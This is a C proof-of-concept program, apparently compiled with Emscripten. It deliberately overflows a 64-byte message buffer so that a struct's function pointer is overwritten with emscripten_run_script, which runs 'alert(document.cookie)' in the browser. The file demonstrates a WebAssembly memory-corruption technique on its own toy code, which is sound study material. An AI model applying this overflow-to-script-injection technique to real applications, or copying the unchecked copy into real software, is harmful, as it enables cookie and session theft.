#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <emscripten.h>
typedef struct GuestMsg {
  char msg[64];
  uint16_t msg_len;
  void (*translate)(const char *);
} GuestMsg;
void print(GuestMsg *guest) {
  guest->translate(guest->msg);
}
void printInEnglish(const char *msg) {
  printf("%s", msg);
}

int main(void) {
  GuestMsg firstGuestMsg;
  char *msg = "hello, my friend!";
  printf("msg size: %lu\n", sizeof(firstGuestMsg));
  firstGuestMsg.translate = &printInEnglish;
  strncpy(firstGuestMsg.msg, msg, strlen(msg));
  firstGuestMsg.msg_len = strlen(msg);
  printf("printInEnglish function address: %p\n", &printInEnglish);
  printf("emscripten_run_script function address: %p\n\n", &emscripten_run_script); // 0x5

  printf("msg content address: %p\n", &firstGuestMsg.msg);
  printf("msg content size: %lu\n", sizeof(firstGuestMsg.msg));
  printf("msg content: %s\n", firstGuestMsg.msg);
  printf("msg length address: %p\n", &firstGuestMsg.msg_len);
  printf("msg length: %u\n", firstGuestMsg.msg_len);
  printf("msg function address: %p\n", &firstGuestMsg.translate);
  printf("msg function: %p (it's the real translate function address)\n", firstGuestMsg.translate);
  char *payload = "alert(document.cookie);"
                  "                                      AA\x00" //random-data
                  "\x40\x00\x00\x00"
                  "\x05\x00\x00\x00"; // Overwriting translate
  memcpy(firstGuestMsg.msg, payload, 72);
  emscripten_run_script("document.cookie=\"passwd=somesecret\"");

  printf("\n----after tampered----\n");
  printf("msg content address: %p\n", &firstGuestMsg.msg);
  printf("msg content size: %lu\n", sizeof(firstGuestMsg.msg));
  printf("msg content: %s\n", firstGuestMsg.msg);
  printf("msg length address: %p\n", &firstGuestMsg.msg_len);
  printf("msg length: %u\n", firstGuestMsg.msg_len);
  printf("msg function address: %p\n", &firstGuestMsg.translate);
  printf("msg function: %p\n (it's the real translate function address)", firstGuestMsg.translate);
  print(&firstGuestMsg);
  return 0;
}

